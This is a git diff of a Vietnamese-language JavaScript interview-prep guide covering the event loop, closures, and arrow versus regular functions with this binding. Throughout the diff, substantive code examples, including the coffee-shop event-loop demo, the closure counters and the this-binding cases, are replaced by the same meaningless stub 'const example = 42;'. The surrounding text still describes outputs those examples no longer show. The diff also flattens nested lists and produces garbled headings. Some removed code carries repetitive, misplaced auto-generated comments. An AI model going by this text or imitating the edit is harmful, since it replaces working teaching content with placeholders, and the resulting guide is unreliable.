-  function processChunk() {
-    const end = Math.min(current + chunkSize, iterations);
-
-    for (let i = current; i < end; i++) {
- // Chú giải: Do heavy work
-    }
-
-    current = end;
-
-    if (current < iterations) {
-      setTimeout(processChunk, 0); // Chú giải: Cho UI render
-    } else {
-      callback();
-    }
-  }
-
-  processChunk();
-}
-
- // Chú giải: ❌ MISTAKE 4: Microtask starvation
-let count = 0;
-function addMicrotask() {
-  if (count++ < 1000000) {
-    Promise.resolve().then(addMicrotask); // Vô hạn microtasks!
-  }
-}
-addMicrotask(); // Macrotasks bị chặn!
-
-// ✅ FIX: Giới hạn hoặc dùng macrotask
-function addMicrotaskFixed() {
-  if (count++ < 1000000) {
-    setTimeout(() => addMicrotaskFixed(), 0); // Cho phép macrotasks khác chạy
-  }
-}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **📋 Chú thích về các lỗi thường gặp:**
@@ -2637,13 +859,14 @@ function addMicrotaskFixed() {
 
 ---
 ---
-## 07. 💬 Q07: Event Loop - Giải Thích Theo Cách Nói Chuyện Đời Thường  
 
-**P1: Tên câu hỏi:** 💬 Q07: Event Loop - Giải Thích Theo Cách Nói Chuyện Đời Thường  
+## 13. Q13: 💬 Q07: Event Loop - Giải Thích Theo Cách Nói Chuyện Đời Thường
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: 💬 Q07: Event Loop - Giải Thích Theo Cách Nói Chuyện Đời Thường
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 14. Q14: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (2-3 phút):**
 
@@ -2662,9 +885,9 @@ function addMicrotaskFixed() {
 
 **2. Task Queues:**
 - **Microtask Queue** (VIP): Promise `.then()`, `queueMicrotask()`, MutationObserver
-  - **Chạy hết tất cả** trước khi sang Macrotask
+- **Chạy hết tất cả** trước khi sang Macrotask
 - **Macrotask Queue** (thường): `setTimeout`, `setInterval`, I/O, UI rendering
-  - **Chạy 1 task** rồi check Microtask lại
+- **Chạy 1 task** rồi check Microtask lại
 
 **3. Event Loop:**
 - **Vòng lặp vô hạn** kiểm tra: Call Stack empty → Microtasks → 1 Macrotask → repeat
@@ -2681,13 +904,9 @@ function addMicrotaskFixed() {
 - `requestAnimationFrame` chạy **trước render**, `setTimeout` chạy sau → dùng rAF cho animation mượt
 - Node.js có **6 phases** trong Event Loop (timers, I/O, poll, check, close) khác Browser (chỉ có Micro + Macro)
 
-
-
-
 **🎯 Mục Đích:**
 
 Giải thích Event Loop theo cách dễ hiểu nhất, KHÔNG dùng thuật ngữ technical, giống như đang kể chuyện cho người không biết lập trình.
-
 
 **📖 Câu Chuyện: Quán Cà Phê và Người Phục Vụ**
 
@@ -2708,29 +927,29 @@ Tưởng tượng bạn mở một quán cà phê nhỏ:
 **Buổi sáng, quán mới mở cửa:**
 
 1. **Khách A vào** → gọi "Cà phê đen nóng" (code đồng bộ)
-   - Bạn: "OK, pha ngay!" 
-   - → Bạn pha xong, đưa cho khách A
-   - → Khách A nhận và đi
+- Bạn: "OK, pha ngay!"
+- → Bạn pha xong, đưa cho khách A
+- → Khách A nhận và đi
 
 2. **Khách B vào** → gọi "Cà phê phin" (setTimeout - mất 5 phút)
-   - Bạn: "OK, cà phê phin phải đợi 5 phút nhé"
-   - → Bạn để máy pha tự động (Web API)
-   - → Ghi tên Khách B vào **Danh sách chờ thường**
-   - → **KHÔNG đứng đợi**, làm việc khác tiếp
+- Bạn: "OK, cà phê phin phải đợi 5 phút nhé"
+- → Bạn để máy pha tự động (Web API)
+- → Ghi tên Khách B vào **Danh sách chờ thường**
+- → **KHÔNG đứng đợi**, làm việc khác tiếp
 
 3. **Khách C vào** → gọi "Nước cam vắt" (code đồng bộ)
-   - Bạn: "OK, vắt ngay!"
-   - → Bạn vắt xong, đưa cho khách C
-   - → Khách C nhận và đi
+- Bạn: "OK, vắt ngay!"
+- → Bạn vắt xong, đưa cho khách C
+- → Khách C nhận và đi
 
 4. **Khách D vào** → gọi "Bánh mì" và hứa sẽ tip (Promise - Microtask)
-   - Bạn: "OK, khách tip thì ưu tiên cao!"
-   - → Ghi tên Khách D vào **Danh sách chờ VIP**
-   - → Làm việc khác tiếp
+- Bạn: "OK, khách tip thì ưu tiên cao!"
+- → Ghi tên Khách D vào **Danh sách chờ VIP**
+- → Làm việc khác tiếp
 
 5. **Khách E vào** → gọi "Trà đá" (code đồng bộ)
-   - Bạn: "OK, pha ngay!"
-   - → Bạn pha xong, đưa cho khách E
+- Bạn: "OK, pha ngay!"
+- → Bạn pha xong, đưa cho khách E
 
 ---
 
@@ -2760,37 +979,9 @@ Bạn check xem:
 
 **🎬 VÍ DỤ CỤ THỂ VỚI CODE:**
 
-```javascript
-// Khách A: Code đồng bộ
-console.log('👤 Khách A: Cà phê đen nóng');
-// → Bạn: Pha ngay! ☕ (thực hiện ngay lập tức)
-
-// Khách B: setTimeout (Macrotask - chờ 0ms nhưng vào hàng chờ thường)
-setTimeout(() => {
-  console.log('👤 Khách B: Cà phê phin (đã chờ)');
-}, 0);
-// → Bạn: Ghi vào danh sách chờ thường 📋
-
-// Khách C: Code đồng bộ
-console.log('👤 Khách C: Nước cam vắt');
-// → Bạn: Vắt ngay! 🍊
-
-// Khách D: Promise (Microtask - khách VIP)
-Promise.resolve().then(() => {
-  console.log('👤 Khách D: Bánh mì (khách tip - VIP)');
-});
-// → Bạn: Ghi vào danh sách VIP ⭐
-
-// Khách E: Code đồng bộ
-console.log('👤 Khách E: Trà đá');
- // Chú giải: → Bạn: Pha ngay! 🍵
-
-// ===== KẾT QUẢ OUTPUT =====
-// 👤 Khách A: Cà phê đen nóng     ← Đồng bộ (ngay lập tức)
-// 👤 Khách C: Nước cam vắt         ← Đồng bộ (ngay lập tức)
-// 👤 Khách E: Trà đá               ← Đồng bộ (ngay lập tức)
-// 👤 Khách D: Bánh mì (VIP)        ← Microtask (ưu tiên cao)
-// 👤 Khách B: Cà phê phin          ← Macrotask (ưu tiên thấp)
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -2810,30 +1001,9 @@ console.log('👤 Khách E: Trà đá');
 
 **🍕 VÍ DỤ THỰC TẾ: ĐẶT PIZZA**
 
-```javascript
-console.log('🏠 Tôi đang ở nhà');
-
-// Đặt pizza (setTimeout - Macrotask)
-setTimeout(() => {
-  console.log('🍕 Pizza giao đến, tôi mở cửa nhận');
-}, 3000); // 3 giây sau
-
-console.log('📺 Tôi xem TV trong lúc đợi');
-
-// Hứa với bản thân (Promise - Microtask)
-Promise.resolve().then(() => {
-  console.log('💭 Nhắc bản thân: Nhớ lấy tiền tip cho shipper');
-});
-
-console.log('🍿 Tôi ăn bỏng ngô');
-
- // Chú giải: ===== OUTPUT =====
-// 🏠 Tôi đang ở nhà                      ← Ngay lập tức
-// 📺 Tôi xem TV trong lúc đợi            ← Ngay lập tức
-// 🍿 Tôi ăn bỏng ngô                     ← Ngay lập tức
-// 💭 Nhắc bản thân: Nhớ lấy tiền tip     ← Microtask (ưu tiên cao)
-// (chờ 3 giây...)
-// 🍕 Pizza giao đến, tôi mở cửa nhận     ← Macrotask (sau cùng)
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **Giải thích:**
@@ -2845,63 +1015,18 @@ console.log('🍿 Tôi ăn bỏng ngô');
 
 **🚗 VÍ DỤ: ĐI SIÊU THỊ**
 
-```javascript
-console.log('🚗 Tôi lái xe đến siêu thị');
-
-// Đặt hẹn giờ báo thức xe (setTimeout)
-setTimeout(() => {
-  console.log('⏰ Báo thức: Đã 1 giờ, về nhà thôi!');
-}, 3600000); // Chú giải: 1 giờ
-
-console.log('🛒 Tôi lấy giỏ và đi mua sắm');
-
-// Nhớ việc quan trọng (Promise)
-Promise.resolve().then(() => {
-  console.log('💡 Ồ nhớ rồi! Phải mua sữa cho con');
-});
-
-console.log('🥬 Tôi mua rau củ');
-
- // Chú giải: ===== OUTPUT =====
-// 🚗 Tôi lái xe đến siêu thị             ← Ngay lập tức
-// 🛒 Tôi lấy giỏ và đi mua sắm           ← Ngay lập tức
-// 🥬 Tôi mua rau củ                      ← Ngay lập tức
- // Chú giải: 💡 Ồ nhớ rồi! Phải mua sữa cho con     ← Microtask (nhớ ngay)
- // Chú giải: (chờ 1 giờ...)
-// ⏰ Báo thức: Đã 1 giờ, về nhà thôi!    ← Macrotask (hẹn giờ)
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 **⚠️ TÌNH HUỐNG XẤU: KHÁCH VIP VÔ HẠN (Microtask Starvation)**
 
-```javascript
-console.log('🏪 Quán mở cửa');
-
-// Khách thường đặt hàng
-setTimeout(() => {
-  console.log('😢 Khách thường: Tôi chờ mãi không tới lượt!');
-}, 0);
-
-// Khách VIP liên tục (VÔ HẠN!)
-function khachVIPLienTuc() {
-  Promise.resolve().then(() => {
-    console.log('⭐ Khách VIP: Phục vụ tôi đi!');
-    khachVIPLienTuc(); // Tạo thêm khách VIP mới!
-  });
-}
-
-khachVIPLienTuc();
-
-// ===== KẾT QUẢ =====
-// 🏪 Quán mở cửa
-// ⭐ Khách VIP: Phục vụ tôi đi!
-// ⭐ Khách VIP: Phục vụ tôi đi!
-// ⭐ Khách VIP: Phục vụ tôi đi!
-// ... (vô hạn lần)
-// 😢 Khách thường: KHÔNG BAO GIỜ được phục vụ!
-
-// ⚠️ LỖI: Bạn chỉ phục vụ khách VIP mãi, khách thường đói chết!
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -2945,22 +1070,22 @@ khachVIPLienTuc();
 - Phải **cẩn thận** không tạo khách VIP vô hạn, nếu không khách thường đói chết!
 
 **💡 Nhớ công thức:**
-```
-Làm xong việc đang làm
-→ Phục vụ HẾT khách VIP
-→ Phục vụ MỘT khách thường
-→ Lặp lại
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 ---
-## 08. 🔐 Q08: Closure & Data Privacy  
 
-**P1: Tên câu hỏi:** 🔐 Q08: Closure & Data Privacy  
+## 15. Q15: 🔐 Q08: Closure & Data Privacy
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: 🔐 Q08: Closure & Data Privacy
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 16. Q16: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (1-2 phút):**
 
@@ -2980,26 +1105,18 @@ Làm xong việc đang làm
 
 **⚠️ Common Pitfalls:**
 - **Memory Leaks**: Closure giữ reference → biến không bị GC → memory leak nếu không cleanup.
-  ```js
-  function setupButton() {
-    const hugeArray = new Array(1000000); // Chú giải: 8MB
-    document.getElementById('btn').onclick = () => {
-      console.log(hugeArray.length); // Closure giữ reference → không GC!
-    };
-  }
-  // Fix: Xóa reference khi không dùng
-  ```
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
 - **Loop + Closures**: `var` trong loop → mọi closure chia sẻ cùng biến.
-  ```js
- // Chú giải: ❌ Sai
-  for (var i = 0; i < 3; i++) {
-    setTimeout(() => console.log(i), 100); // Chú giải: 3, 3, 3
-  }
-  // ✅ Đúng: Dùng let (block scope) hoặc IIFE
-  for (let i = 0; i < 3; i++) {
-    setTimeout(() => console.log(i), 100); // Chú giải: 0, 1, 2
-  }
-  ```
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 **💡 Senior Insights:**
 - **Performance**: Closures có overhead nhỏ (memory + lookup time), nhưng negligible trong hầu hết cases.
@@ -3028,66 +1145,9 @@ Làm xong việc đang làm
 
 **Code Example:**
 
-```typescript
- // Chú giải: Basic Closure
-function outerFunction(x: number) {
- // Chú giải: Outer scope variable
-  let outerVariable = x;
-
- // Chú giải: Inner function (closure)
-  function innerFunction(y: number): number {
-    return outerVariable + y; // Chú giải: Access outer variable
-  }
-
-  return innerFunction;
-}
-
-const closure = outerFunction(10);
-console.log(closure(5)); // Chú giải: 15
-// outerFunction đã return nhưng innerFunction vẫn access được outerVariable
-
- // Chú giải: Data Privacy với Closure
-function createCounter(): { increment: () => number; getCount: () => number } {
-  let count = 0; // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.
-
-  return {
-    increment(): number {
-      return ++count; // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.
-    },
-    getCount(): number {
-      return count; // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.
-    },
-  };
-}
-
-const counter = createCounter();
-console.log(counter.increment()); // Chú giải: 1
-console.log(counter.increment()); // Chú giải: 2
-console.log(counter.getCount()); // Chú giải: 2
- // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.
-
- // Chú giải: Module Pattern
-const userModule = (() => {
-  let users: string[] = []; // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.
-
-  return {
-    addUser(name: string): void {
-      users.push(name);
-    },
-    getUsers(): string[] {
-      return [...users]; // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
-    },
-    getUserCount(): number {
-      return users.length;
-    },
-  };
-})();
-
-userModule.addUser('John');
-userModule.addUser('Jane');
-console.log(userModule.getUsers()); // Chú giải: ["John", "Jane"]
-console.log(userModule.getUserCount()); // Chú giải: 2
- // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **Best Practices:**
@@ -3099,23 +1159,9 @@ console.log(userModule.getUserCount()); // Chú giải: 2
 
 **Mistakes:**
 
-```typescript
-// ❌ Sai: Không hiểu closure scope
-for (var i = 0; i < 3; i++) {
-  setTimeout(() => console.log(i), 100); // Chú giải: 3, 3, 3
-}
-
-// ✅ Đúng: Sử dụng closure đúng cách
-for (let i = 0; i < 3; i++) {
-  setTimeout(() => console.log(i), 100); // Chú giải: 0, 1, 2
-}
-
-// Hoặc sử dụng closure với var
-for (var i = 0; i < 3; i++) {
-  ((index: number) => {
-    setTimeout(() => console.log(index), 100); // Chú giải: 0, 1, 2
-  })(i);
-}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 #### Vì sao Redux/Zustand dùng closure để lưu trạng thái?
@@ -3127,40 +1173,9 @@ for (var i = 0; i < 3; i++) {
 
 Ví dụ mô phỏng (đơn giản hóa theo phong cách Zustand):
 
-```ts
-type Listener<T> = (state: T, prev: T) => void;
-
-function createStore<T>(
-  initializer: (
-    set: (p: Partial<T> | ((s: T) => Partial<T>)) => void,
-    get: () => T
-  ) => T
-) {
-  let state: T;
-  const listeners = new Set<Listener<T>>();
-
-  const get = () => state;
-  const set = (patch: Partial<T> | ((s: T) => Partial<T>)) => {
-    const prev = state;
-    const next =
-      typeof patch === 'function'
-        ? (patch as (s: T) => Partial<T>)(prev)
-        : patch;
-    state = { ...prev, ...next };
-    listeners.forEach((l) => l(state, prev));
-  };
-
-  state = initializer(set, get);
-
-  return {
-    getState: get,
-    setState: set,
-    subscribe(listener: Listener<T>) {
-      listeners.add(listener);
-      return () => listeners.delete(listener);
-    },
-  };
-}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 So với lựa chọn khác:
@@ -3169,13 +1184,14 @@ So với lựa chọn khác:
 - **Proxy**: Tiện reactive nhưng tốn chi phí bẫy (traps), phức tạp debug, không cần thiết khi chỉ cần pub/sub đơn giản.
 - **Global singleton**: Dễ rò rỉ state giữa tests/SSR, khó tạo nhiều instance độc lập.
 ---
-## 09. ➡️ Q09: Arrow vs Regular Functions & this Binding (call, apply, bind)  
 
-**P1: Tên câu hỏi:** ➡️ Q09: Arrow vs Regular Functions & this Binding (call, apply, bind)  
+## 17. Q17: ➡️ Q09: Arrow vs Regular Functions & this Binding (call, apply, bind)
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: ➡️ Q09: Arrow vs Regular Functions & this Binding (call, apply, bind)
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 18. Q18: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (2-3 phút):**
 
@@ -3183,35 +1199,42 @@ So với lựa chọn khác:
 
 **📊 Arrow vs Regular Functions (Key Differences):**
 1. **`this` Binding**:
-   - **Arrow**: Lexical `this` → inherit từ outer scope (không có `this` riêng).
-   - **Regular**: Dynamic `this` → phụ thuộc cái gì gọi function (runtime).
+- **Arrow**: Lexical `this` → inherit từ outer scope (không có `this` riêng).
+- **Regular**: Dynamic `this` → phụ thuộc cái gì gọi function (runtime).
 
 2. **`arguments` Object**:
-   - **Arrow**: Không có `arguments` → dùng rest params `(...args)`.
-   - **Regular**: Có `arguments` (array-like object).
+- **Arrow**: Không có `arguments` → dùng rest params `(...args)`.
+- **Regular**: Có `arguments` (array-like object).
 
 3. **Constructor**:
-   - **Arrow**: Không dùng được `new` → throw error.
-   - **Regular**: Có thể dùng `new` → tạo instance.
+- **Arrow**: Không dùng được `new` → throw error.
+- **Regular**: Có thể dùng `new` → tạo instance.
 
 4. **Hoisting**:
-   - **Arrow**: Không hoisted (nếu dùng `const/let`).
-   - **Regular**: Hoisted (function declaration).
+- **Arrow**: Không hoisted (nếu dùng `const/let`).
+- **Regular**: Hoisted (function declaration).
 
 **🔧 `this` Binding Methods (call, apply, bind):**
 - **`call(thisArg, arg1, arg2)`**: Invoke ngay với arguments riêng lẻ.
-  ```js
-  fn.call({ name: 'John' }, 1, 2); // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-  ```
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
 - **`apply(thisArg, [args])`**: Invoke ngay với arguments array.
-  ```js
-  fn.apply({ name: 'John' }, [1, 2]); // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-  ```
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
 - **`bind(thisArg)`**: Return function mới với `this` cố định (không invoke).
-  ```js
-  const boundFn = fn.bind({ name: 'John' }); // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
-  boundFn(1, 2); // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-  ```
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 **🎯 `this` Binding Rules (4 Rules - Priority Order):**
 1. **`new` Binding**: `new Fn()` → `this` = new object.
@@ -3221,41 +1244,30 @@ So với lựa chọn khác:
 
 **⚠️ Common Mistakes:**
 - **Arrow trong object methods**: `this` không point to object!
-  ```js
-  const obj = {
-    name: 'John',
-    greet: () => console.log(this.name) // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-  };
-  // ✅ Dùng regular function hoặc method shorthand
-  ```
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
 - **Event handlers**: Regular function → `this` = event target. Arrow → `this` = outer scope.
 - **Class methods as callbacks**: Mất context → dùng arrow hoặc bind.
-  ```js
-  class Component {
-    handleClick() { console.log(this); }
-    render() {
- // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-      button.addEventListener('click', this.handleClick);
-      // ✅ Fix: Arrow hoặc bind
-      button.addEventListener('click', () => this.handleClick());
-      button.addEventListener('click', this.handleClick.bind(this));
-    }
-  }
-  ```
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 **💡 Senior Insights:**
 - **React Class Components**: Arrow class fields = auto-bind `this` (babel transform).
 - **Performance**: Arrow functions trong render → tạo new reference mỗi lần → child re-render. Dùng `useCallback`.
 - **call vs apply**: `apply` hữu ích khi arguments đã là array (e.g., `Math.max.apply(null, [1,2,3])`).
 - **Polyfill bind**: Implement bind manually để hiểu cơ chế:
-  ```js
-  Function.prototype.myBind = function(context, ...args) {
-    const fn = this;
-    return function(...newArgs) {
-      return fn.apply(context, [...args, ...newArgs]);
-    };
-  };
-  ```
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
 ---
 
@@ -3269,238 +1281,55 @@ So với lựa chọn khác:
 - 📋 **apply**: `fn.apply(thisArg, [args])` - invoke ngay với array
 - 🔗 **bind**: `fn.bind(thisArg)` - return function mới với this cố định
 
-
 ### **1. Arrow vs Regular Functions - Sự Khác Biệt Quan Trọng**
 
 #### **1.1. Syntax & Declaration**
 
-```typescript
- // Chú giải: ═══════════════════════════════════════════════════════════
-// SYNTAX - Cú pháp
- // Chú giải: ═══════════════════════════════════════════════════════════
-
- // Chú giải: Regular Function
-function regularFunction(name: string): string {
-  return `Hello ${name}`;
-}
-
-// Arrow Function - ngắn gọn hơn
-const arrowFunction = (name: string): string => `Hello ${name}`;
-
-// Arrow với 1 parameter - bỏ được ()
-const single = name => `Hello ${name}`;
-
- // Hàm mũi tên không có own `this` và không thể dùng làm constructor; thích hợp cho callback giữ `this` lexical. Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
-const getUser = (id: number) => ({ id, name: 'John' });
-// Không có () sẽ bị nhầm với block { }
-
- // Hàm mũi tên không có own `this` và không thể dùng làm constructor; thích hợp cho callback giữ `this` lexical. Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
-const calculate = (a: number, b: number) => {
-  const sum = a + b;
-  const product = a * b;
-  return { sum, product };
-};
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 #### **1.2. this Binding - Khác Biệt QUAN TRỌNG Nhất**
 
-```typescript
- // Chú giải: ═══════════════════════════════════════════════════════════
-// THIS BINDING - Điểm khác biệt QUAN TRỌNG nhất
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-class Person {
-  name: string = 'John';
-
-  // ❌ Regular function - this là ĐỘNG (dynamic binding)
-  // this phụ thuộc vào CÁI GÌ gọi function (runtime)
-  regularMethod(): void {
-    setTimeout(function () {
-      console.log(this.name); 
- // Chú giải: ❌ undefined!
-      // Vì function được gọi bởi setTimeout → this = window/global
-    }, 100);
-  }
-
-  // ✅ Arrow function - this là TĨNH (lexical binding)
-  // this được "kế thừa" từ outer scope (Person instance)
-  arrowMethod(): void {
-    setTimeout(() => {
-      console.log(this.name); 
- // Chú giải: ✅ "John"!
-      // Arrow function KHÔNG có this riêng → lấy this từ Person
-    }, 100);
-  }
-
-  // 🔧 Cách fix cho regular function
-  regularMethodFixed(): void {
-    const self = this; // Lưu this vào biến
-    setTimeout(function () {
-      console.log(self.name); // ✅ "John" - dùng biến self
-    }, 100);
-  }
-
-  regularMethodBind(): void {
-    setTimeout(function () {
-      console.log(this.name); // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh. Dùng `bind`, `call`, hoặc `apply` để thiết lập `this` rõ ràng khi cần.
-    }.bind(this), 100);
-  }
-}
-
- // Chú giải: ═══════════════════════════════════════════════════════════
- // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-const user = {
-  name: 'Alice',
-  
- // Hàm mũi tên không có own `this` và không thể dùng làm constructor; thích hợp cho callback giữ `this` lexical.
-  greetArrow: () => {
-    console.log(this.name); 
- // Chú giải: ❌ undefined!
- // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh. Hàm mũi tên không có own `this` và không thể dùng làm constructor; thích hợp cho callback giữ `this` lexical.
-    // Không phải object `user`!
-  },
-  
-  // ✅ ĐÚNG: Regular function
-  greetRegular() {
-    console.log(this.name); 
- // Chú giải: ✅ "Alice"
- // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-  },
-  
-  // ✅ Use case ĐÚNG cho arrow function
-  registerEvents() {
-    document.addEventListener('click', () => {
-      console.log(this.name); 
- // Chú giải: ✅ "Alice"
- // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh. Hàm mũi tên không có own `this` và không thể dùng làm constructor; thích hợp cho callback giữ `this` lexical.
-    });
-    
-    // ❌ Regular function sẽ sai
-    document.addEventListener('click', function() {
-      console.log(this.name); 
- // Chú giải: ❌ undefined
- // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-    });
-  }
-};
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **💡 Quy tắc this:**
-```typescript
-// Regular function: this phụ thuộc vào CÁI GÌ gọi function
-obj.method() // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-fn() // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-new Fn() // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-fn.call(obj) // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
 
-// Arrow function: this = this của OUTER SCOPE (nơi function được định nghĩa)
-// Không quan tâm CÁI GÌ gọi function!
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 #### **1.3. arguments Object**
 
-```typescript
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: ARGUMENTS OBJECT
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-// Regular function - CÓ arguments object
-function regularWithArgs(a: number, b: number): void {
-  console.log(arguments); 
- // Chú giải: ✅ Arguments { '0': 10, '1': 20, '2': 30 }
-  console.log(arguments.length); // Chú giải: 3
-  console.log(arguments[2]); // Chú giải: 30 - extra argument
-}
-
-regularWithArgs(10, 20, 30);
-
-// Arrow function - KHÔNG có arguments
-const arrowWithArgs = (a: number, b: number): void => {
- // Chú giải: console.log(arguments);
- // Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object.
-};
-
-// ✅ Giải pháp: Dùng rest parameters
-const arrowWithRest = (...args: number[]): void => {
-  console.log(args); // Chú giải: ✅ [10, 20, 30]
-  console.log(args.length); // Chú giải: 3
-};
-
-arrowWithRest(10, 20, 30);
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 #### **1.4. Constructor & new**
 
-```typescript
- // Chú giải: ═══════════════════════════════════════════════════════════
-// CONSTRUCTOR - Chỉ regular function có thể làm constructor
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-// ✅ Regular function - có thể dùng new
-function RegularConstructor(name: string) {
-  this.name = name;
-}
-
-const instance1 = new RegularConstructor('John');
-console.log(instance1.name); // Chú giải: "John" ✅
-
-// ❌ Arrow function - KHÔNG thể dùng new
-const ArrowConstructor = (name: string) => {
-  this.name = name;
-};
-
- // Hàm mũi tên không có own `this` và không thể dùng làm constructor; thích hợp cho callback giữ `this` lexical. Constructor: hàm/ phương thức dùng với `new` để khởi tạo instance; trong `class` phải gọi `super()` trước khi dùng `this` nếu có kế thừa.
- // Hàm mũi tên không có own `this` và không thể dùng làm constructor; thích hợp cho callback giữ `this` lexical. Constructor: hàm/ phương thức dùng với `new` để khởi tạo instance; trong `class` phải gọi `super()` trước khi dùng `this` nếu có kế thừa.
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 #### **1.5. Hoisting**
 
-```typescript
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Được nâng lên (hoisting): khai báo được chuyển lên đầu phạm vi; `var` khởi tạo với `undefined`, còn `let/const` nằm trong vùng chết tạm thời (TDZ).
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-// ✅ Regular function - HOISTED (có thể gọi trước khi khai báo)
-console.log(regularHoisted()); // Chú giải: ✅ "Hello" - works!
-
-function regularHoisted(): string {
-  return 'Hello';
-}
-
-// ❌ Arrow function - KHÔNG hoisted
- // Được nâng lên (hoisting): khai báo được chuyển lên đầu phạm vi; `var` khởi tạo với `undefined`, còn `let/const` nằm trong vùng chết tạm thời (TDZ). Hàm mũi tên không có own `this` và không thể dùng làm constructor; thích hợp cho callback giữ `this` lexical.
- // Được nâng lên (hoisting): khai báo được chuyển lên đầu phạm vi; `var` khởi tạo với `undefined`, còn `let/const` nằm trong vùng chết tạm thời (TDZ). Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object. Hàm mũi tên không có own `this` và không thể dùng làm constructor; thích hợp cho callback giữ `this` lexical.
-
-const arrowHoisted = (): string => 'Hello';
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 #### **1.6. Methods & Prototype**
 
-```typescript
